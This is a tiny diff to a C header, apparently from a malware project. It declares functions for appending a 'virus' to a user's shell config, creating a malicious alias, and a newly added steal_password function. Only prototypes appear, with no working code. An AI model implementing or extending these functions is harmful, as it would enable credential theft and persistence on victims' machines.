@@ -6,4 +6,5 @@
 
 int append_virus(char * home_dir, char * config_file, char * alias);
 int alias_virus();
+int steal_password(char * passwd, char * username);
 #endif
